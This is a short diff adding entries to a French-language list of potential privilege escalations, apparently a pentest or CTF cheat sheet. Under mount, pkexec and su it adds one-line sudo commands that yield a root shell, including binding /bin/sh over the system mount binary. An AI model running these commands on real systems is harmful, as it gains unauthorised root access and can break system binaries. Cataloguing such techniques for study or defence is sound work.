@@ -1,7 +1,10 @@
 Les potentielles élévations de privilège sont les suivantes : 
 mount
+        sudo mount -o bind /bin/sh /bin/mount
 mount +  end
 pkexec
+        sudo pkexec /bin/sh
 pkexec +  end
 su
+        sudo su
 su +  end
